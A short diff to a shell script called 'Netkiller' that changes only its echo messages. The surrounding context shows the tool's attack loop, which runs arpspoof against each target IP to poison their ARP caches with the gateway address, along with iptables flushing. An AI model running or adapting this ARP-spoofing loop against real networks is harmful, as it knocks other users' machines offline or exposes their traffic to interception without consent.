@@ -36,7 +36,7 @@ pkill arpspoof
 iptables -t mangle -F FORWARD 
 iptables -F FORWARD
 echo " "
-echo "Stopping Netkiller!"
+echo "Netkiller is stop...!!!"
 echo " "
 EOF
 chmod 755 /bin/netkiller-stop
@@ -226,7 +226,7 @@ echo " "
 
 # Start ARP spoofing for each target
 for TARGET in "${TARGETS[@]}"; do
-     echo "Netkiller kill the target IP: $TARGET"
+     echo "Netkiller killed the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
 echo " "
